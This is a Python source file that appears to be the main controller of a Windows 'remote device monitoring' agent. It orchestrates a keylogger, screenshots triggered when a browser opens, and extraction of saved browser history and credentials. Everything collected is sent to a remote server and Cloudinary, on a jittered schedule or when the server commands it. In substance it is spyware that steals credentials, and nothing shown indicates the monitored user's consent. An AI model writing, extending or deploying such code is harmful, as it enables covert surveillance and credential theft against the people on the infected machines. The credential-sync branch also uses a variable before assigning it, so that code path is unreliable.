"""
Controller Agent - Main Entry Point

Windows background agent for remote device monitoring.
Integrates all modules: config, screenshot, keylogger, uploader.
"""

import atexit
import logging
import os
import random
import signal
import sys
import threading
import time
import uuid
import json
from datetime import datetime
from typing import Optional

from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('agent.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)


class ControllerAgent:
    """
    Main agent class that orchestrates all modules.
    
    Lifecycle:
    1. Initialize core components (queue, auth, api client)
    2. Register with server (or use stored credentials)
    3. Start config sync
    4. Start feature modules based on config
    5. Start command polling
    6. Run until stopped
    """
    
    def __init__(self):
        self._running = False
        
        # Core components (initialized in order)
        self.queue_manager = None
        self.auth = None
        self.api_client = None
        self.config_manager = None
        self.policy_engine = None
        
        # Feature modules
        self.cloudinary_client = None
        self.metadata_sync = None
        self.screenshot_capture = None
        self.browser_monitor = None
        self.browser_extractor = None
        self.keylogger = None
        self.command_poller = None
        
        # Background loops
        self._browser_sync_thread: Optional[threading.Thread] = None
    
    def _init_core(self):
        """Initialize core components."""
        logger.info("Initializing core components...")
        
        # Queue manager
        from core.queue_manager import get_queue_manager, QueueManager
        self.queue_manager = QueueManager()
        
        # Auth
        from core.auth import DeviceAuth
        self.auth = DeviceAuth(self.queue_manager)
        
        # API client
        from network.api_client import APIClient
        server_url = os.getenv('SERVER_URL', 'http://127.0.0.1:8000')
        self.api_client = APIClient(base_url=server_url, auth=self.auth)
        
        logger.info(f"API client configured for: {server_url}")
    
    def _register_device(self) -> bool:
        """Register device with server or use stored credentials."""
        if self.auth.is_authenticated:
            logger.info(f"Using stored credentials (device: {self.auth.device_id})")
            return True
        
        logger.info("Registering device with server...")
        
        registration_data = self.auth.get_registration_data()
        response = self.api_client.register_device(registration_data)
        
        if response and 'token' in response:
            self.auth.store_auth(
                token=response['token'],
                device_id=response['device_id']
            )
            logger.info(f"Device registered: {response['device_id']}")
            return True
        else:
            logger.error("Device registration failed")
            return False
    
    def _init_config(self):
        """Initialize config manager and policy engine."""
        from core.config_manager import ConfigManager
        from core.policy_engine import PolicyEngine
        
        self.config_manager = ConfigManager(self.queue_manager, self.api_client)
        self.policy_engine = PolicyEngine(self.config_manager)
        
        # Register config change callback
        self.config_manager.add_config_callback(self._on_config_change)
    
    def _init_uploader(self):
        """Initialize Cloudinary and metadata sync."""
        try:
            from modules.uploader.cloudinary_client import CloudinaryClient
            from modules.uploader.metadata_sync import MetadataSyncService
            
            self.cloudinary_client = CloudinaryClient()
            self.metadata_sync = MetadataSyncService(
                self.api_client,
                self.queue_manager,
                self.policy_engine
            )
            logger.info("Uploader modules initialized")
        except ValueError as e:
            logger.warning(f"Cloudinary not configured: {e}")
            self.cloudinary_client = None
    
    def _init_screenshot(self):
        """Initialize screenshot modules."""
        from modules.screenshot.capture import ScreenshotCapture
        from modules.screenshot.browser_monitor import BrowserMonitor
        
        quality = self.policy_engine.get_screenshot_quality()
        self.screenshot_capture = ScreenshotCapture(quality=quality)
        
        self.browser_monitor = BrowserMonitor(
            browser_list=self.policy_engine.get_monitored_browsers()
        )
        self.browser_monitor.set_callback(self._on_browser_detected)
        
        logger.info("Screenshot modules initialized")

    def _init_browser_extractor(self):
        """Initialize browser data extractor."""
        from modules.browser.extractor import BrowserExtractor
        self.browser_extractor = BrowserExtractor()
        logger.info("Browser extractor module initialized")
    
    def _init_keylogger(self):
        """Initialize keylogger module."""
        from modules.keylogger.keylogger import KeyLogger
        
        sync_interval = self.policy_engine.get_keylog_sync_interval()
        self.keylogger = KeyLogger(
            sync_callback=self._on_keylog_sync,
            sync_interval=sync_interval
        )
        
        logger.info("Keylogger module initialized")
    
    def _init_command_poller(self):
        """Initialize command polling."""
        from network.command_poller import CommandPoller
        
        self.command_poller = CommandPoller(
            self.api_client,
            self.policy_engine
        )
        
        # Register command handlers
        self.command_poller.register_handler('screenshot', self._handle_screenshot_command)
        self.command_poller.register_handler('config_refresh', self._handle_config_refresh)
        self.command_poller.register_handler('keylog_sync', self._handle_keylog_sync_command)
        
        # Browser commands
        self.command_poller.register_handler('browser_sync', self._handle_browser_sync)
        self.command_poller.register_handler('browser_history_sync', self._handle_browser_sync)
        self.command_poller.register_handler('browser_credential_sync', self._handle_browser_sync)
        # cookie sync removed
        
        logger.info("Command poller initialized")
    
    # ==================== Callbacks ====================
    
    def _on_config_change(self, config):
        """Handle configuration changes."""
        logger.info("Configuration changed, updating modules...")
        
        # Update screenshot quality
        if self.screenshot_capture:
            self.screenshot_capture.quality = config.screenshot_quality
        
        # Update browser list
        if self.browser_monitor:
            self.browser_monitor.update_browser_list(config.monitored_browsers)
        
        # Update keylog interval
        if self.keylogger:
            self.keylogger.update_sync_interval(config.keylog_sync_interval)
        
        # Start/stop features based on config
        self._apply_feature_toggles()
    
    def _apply_feature_toggles(self):
        """Start or stop features based on current policy."""
        # Browser monitoring
        if self.browser_monitor:
            if self.policy_engine.can_trigger_on_browser():
                if not self.browser_monitor.is_running():
                    self.browser_monitor.start()
            else:
                if self.browser_monitor.is_running():
                    self.browser_monitor.stop()
        
        # Keylogger
        if self.keylogger:
            if self.policy_engine.can_log_keys():
                if not self.keylogger.is_running():
                    self.keylogger.start()
            else:
                if self.keylogger.is_running():
                    self.keylogger.stop()
        
        # Browser background sync
        if self.policy_engine.can_extract_browser_data():
            if not self._browser_sync_thread or not self._browser_sync_thread.is_alive():
                self._start_browser_sync()
        else:
            # We don't stop the thread immediately, the loop will check policy
            pass
    
    def _on_browser_detected(self, browser_name: str, window_title: str):
        """Handle browser launch detection."""
        if not self.policy_engine.can_trigger_on_browser():
            return
        
        logger.info(f"Browser trigger: {browser_name}")
        
        # Small delay to let browser window fully appear
        time.sleep(1)
        
        self._capture_and_upload('browser')
    
    def _on_keylog_sync(self, data: str, start: datetime, end: datetime, chars: int, switches: int):
        """Handle keylog sync callback."""
        if not self.policy_engine.can_log_keys():
            return
        
        if self.metadata_sync:
            self.metadata_sync.send_keylog_data(
                data=data,
                start_time=start,
                end_time=end,
                character_count=chars,
                window_switches=switches
            )
    
    # ==================== Command Handlers ====================
    
    def _handle_screenshot_command(self, command_id: str, payload: dict) -> dict:
        """Handle on-demand screenshot command."""
        if not self.policy_engine.can_take_screenshot():
            return {'error': 'Screenshots disabled'}
        
        result = self._capture_and_upload('command')
        
        if result:
            return {'status': 'success', 'url': result}
        else:
            return {'status': 'failed'}
    
    def _handle_config_refresh(self, command_id: str, payload: dict) -> dict:
        """Handle config refresh command."""
        if self.config_manager:
            self.config_manager.sync_config()
            return {'status': 'refreshed'}
        return {'status': 'no config manager'}
    
    def _handle_keylog_sync_command(self, command_id: str, payload: dict) -> dict:
        """Handle immediate keylog sync command."""
        if self.keylogger and self.keylogger.is_running():
            self.keylogger._sync_to_server()
            return {'status': 'synced'}
        return {'status': 'keylogger not running'}

    def _handle_browser_sync(self, command_id: str, payload: dict) -> dict:
        """Handle manual browser data sync command."""
        command_type = payload.get('type', 'browser_sync')
        
        if not self.policy_engine.can_extract_browser_data():
            return {'error': 'Browser data extraction disabled'}
            
        if not self.browser_extractor:
            return {'error': 'Extractor not initialized'}
            
        logger.info(f"Manual browser sync triggered: {command_type}")
        
        try:
            if command_type == 'browser_history_sync':
                data = self.browser_extractor.collect_all()
                self.metadata_sync.send_browser_history(data['history'])
            elif command_type == 'browser_credential_sync':
                self.metadata_sync.send_browser_credentials(data['credentials'])
            else: # browser_sync
                data = self.browser_extractor.collect_all()
                self.metadata_sync.send_browser_history(data['history'])
                self.metadata_sync.send_browser_credentials(data['credentials'])
                # cookie sync removed
                
            return {'status': 'sync_initiated'}
        except Exception as e:
            logger.error(f"Manual browser sync failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    # ==================== Core Operations ====================
    
    def _capture_and_upload(self, trigger_type: str) -> Optional[str]:
        """Capture screenshot and upload to Cloudinary."""
        if not self.screenshot_capture or not self.cloudinary_client:
            return None
        
        # Capture
        result = self.screenshot_capture.capture()
        if not result:
            return None
        
        file_path, width, height, window_title, process_name = result
        
        try:
            # Upload to Cloudinary
            session_id = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
            
            cloudinary_result = self.cloudinary_client.upload_screenshot(
                file_path=file_path,
                session_id=session_id,
                device_id=self.auth.device_id[:8] if self.auth.device_id else None
            )
            
            if not cloudinary_result:
                return None
            
            # Send metadata to Django
            if self.metadata_sync:
                self.metadata_sync.send_screenshot_metadata(
                    cloudinary_result=cloudinary_result,
                    trigger_type=trigger_type,
                    captured_at=datetime.now(),
                    active_window=window_title,
                    active_process=process_name,
                    screen_width=width,
                    screen_height=height
                )
            
            return cloudinary_result.secure_url
            
        finally:
            # Cleanup temp file
            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except Exception:
                pass

    def _start_browser_sync(self):
        """Start background thread for periodic browser sync."""
        self._browser_sync_thread = threading.Thread(target=self._browser_sync_loop, daemon=True)
        self._browser_sync_thread.start()
        logger.info("Browser background sync started")

    def _browser_sync_loop(self):
        """Background loop for periodic browser data extraction."""
        while self._running:
            if self.policy_engine.can_extract_browser_data():
                try:
                    logger.info("Periodic browser sync triggered")
                    data = self.browser_extractor.collect_all()
                    
                    if data['history']:
                        self.metadata_sync.send_browser_history(data['history'])
                    if data['credentials']:
                        self.metadata_sync.send_browser_credentials(data['credentials'])
                    # cookie sync removed
                        
                except Exception as e:
                    logger.error(f"Periodic browser sync error: {e}")
            
            # Wait for next interval
            interval = self.policy_engine.get_browser_sync_interval()
            
            # Random jitter
            delay = interval + random.randint(-60, 60)
            
            # Sleep in increments
            elapsed = 0
            while self._running and elapsed < delay:
                time.sleep(min(10, delay - elapsed))
                elapsed += 10
    
    # ==================== Lifecycle ====================
    
    def start(self):
        """Start the agent."""
        logger.info("=" * 60)
        logger.info("Controller Agent starting...")
        logger.info("=" * 60)
        
        try:
            # Initialize core
            self._init_core()
            
            # Register device
            if not self._register_device():
                logger.error("Failed to register device, retrying in 60s...")
                time.sleep(60)
                if not self._register_device():
                    raise RuntimeError("Device registration failed")
            
            # Initialize config and policy
            self._init_config()
            
            # Initialize all modules
            self._init_uploader()
            self._init_screenshot()
            self._init_browser_extractor()
            self._init_keylogger()
            self._init_command_poller()
            
            # Start services
            self._running = True
            
            # Start config sync (always runs, even with kill switch)
            self.config_manager.start_sync()
            
            # Start metadata retry service
            if self.metadata_sync:
                self.metadata_sync.start_retry_service()
            
            # Start command polling
            if self.command_poller:
                self.command_poller.start()
            
            # Apply initial feature toggles
            self._apply_feature_toggles()
            
            logger.info("=" * 60)
            logger.info("Controller Agent running. Press Ctrl+C to stop.")
            logger.info("=" * 60)
            
            # Main loop
            while self._running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            logger.info("Shutdown requested by user")
        except Exception as e:
            logger.exception(f"Agent error: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the agent gracefully."""
        logger.info("Stopping agent...")
        self._running = False
        
        # Stop all modules in reverse order
        if self.command_poller:
            self.command_poller.stop()
        
        if self.keylogger and self.keylogger.is_running():
            self.keylogger.stop()
        
        if self.browser_monitor and self.browser_monitor.is_running():
            self.browser_monitor.stop()
        
        if self.metadata_sync:
            self.metadata_sync.stop_retry_service()
        
        if self.config_manager:
            self.config_manager.stop_sync()
        
        logger.info("Agent stopped")


def main():
    """Main entry point."""
    agent = ControllerAgent()
    
    # Handle signals
    def signal_handler(sig, frame):
        logger.info("Signal received, stopping...")
        agent.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Register cleanup
    atexit.register(agent.stop)
    
    # Start agent
    agent.start()


if __name__ == "__main__":
    main()
